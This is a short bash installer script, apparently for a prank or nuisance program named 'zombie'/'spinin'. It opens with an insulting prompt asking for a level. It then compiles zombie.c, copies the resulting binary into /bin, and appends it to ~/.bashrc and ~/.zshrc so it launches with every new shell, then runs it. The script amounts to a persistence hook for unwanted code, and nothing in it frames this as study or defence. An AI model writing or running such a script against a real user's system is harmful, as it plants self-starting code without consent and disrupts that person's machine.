#!/bin/bash

read -p "Welcome u fockin weeb, witch level do you want me to launch ? " mode

gcc zombie.c -o spinin
chmod 755 spinin
cp spinin /bin/
cp spinin.sh /bin/

echo "/bin/spinin" >> ~/.bashrc
echo "/bin/spinin" >> ~/.zshrc

./spinin $mode
